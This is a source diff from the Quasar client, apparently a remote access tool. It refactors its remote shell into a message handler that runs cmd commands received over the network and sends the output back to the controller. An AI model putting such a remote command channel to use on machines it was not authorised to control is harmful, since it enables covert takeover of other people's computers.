@@ -1,4 +1,6 @@
-﻿using Quasar.Common.Messages;
+﻿using Quasar.Client.Networking;
+using Quasar.Common.Messages;
+using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.Globalization;
@@ -6,12 +8,12 @@ using System.IO;
 using System.Text;
 using System.Threading;
 
-namespace Quasar.Client.Utilities
+namespace Quasar.Client.Messages
 {
     /// <summary>
     /// This class manages a remote shell session.
     /// </summary>
-    public class Shell : IDisposable
+    public class RemoteShellHandler : MessageProcessorBase<object>
     {
         /// <summary>
         /// The process of the command-line (cmd).
@@ -46,6 +48,39 @@ namespace Quasar.Client.Utilities
         /// </summary>
         private StreamWriter _inputWriter;
 
+        private readonly QuasarClient _client;
+
+        public RemoteShellHandler(QuasarClient client) : base(false)
+        {
+            _client = client;
+        }
+
+        public override bool CanExecute(IMessage message) => message is DoShellExecute;
+
+        public override bool CanExecuteFrom(ISender sender) => true;
+
+        public override void Execute(ISender sender, IMessage message)
+        {
+            switch (message)
+            {
+                case DoShellExecute shellExec:
+                    Execute(sender, shellExec);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoShellExecute message)
+        {
+            string input = message.Command;
+
+            if ((_prc == null || _prc.HasExited) && input == "exit") return;
+
+            if (input == "exit")
+                Dispose();
+            else
+                ExecuteCommand(input);
+        }
+
         /// <summary>
         /// Creates a new session of the shell.
         /// </summary>
@@ -78,7 +113,7 @@ namespace Quasar.Client.Utilities
 
             RedirectIO();
 
-            Program.ConnectClient.Send(new DoShellExecuteResponse
+            _client.Send(new DoShellExecuteResponse
             {
                 Output = "\n>> New Session created\n"
             });
@@ -138,7 +173,7 @@ namespace Quasar.Client.Utilities
 
             if (string.IsNullOrEmpty(toSend)) return;
 
-            Program.ConnectClient.Send(new DoShellExecuteResponse {Output = toSend, IsError = isError});
+            _client.Send(new DoShellExecuteResponse {Output = toSend, IsError = isError});
 
             textBuffer.Clear();
         }
@@ -175,7 +210,7 @@ namespace Quasar.Client.Utilities
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    _client.Send(new DoShellExecuteResponse
                     {
                         Output = "\n>> Session unexpectedly closed\n",
                         IsError = true
@@ -218,7 +253,7 @@ namespace Quasar.Client.Utilities
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    _client.Send(new DoShellExecuteResponse
                     {
                         Output = "\n>> Session unexpectedly closed\n",
                         IsError = true
@@ -244,7 +279,7 @@ namespace Quasar.Client.Utilities
                 }
                 catch (Exception ex)
                 {
-                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    _client.Send(new DoShellExecuteResponse
                     {
                         Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
                         IsError = true
@@ -271,17 +306,7 @@ namespace Quasar.Client.Utilities
             return Encoding.UTF8.GetString(utf8Text);
         }
 
-        /// <summary>
-        /// Releases all resources used by this class.
-        /// </summary>
-        public void Dispose()
-        {
-            Dispose(true);
-
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool disposing)
+        protected override void Dispose(bool disposing)
         {
             if (disposing)
             {
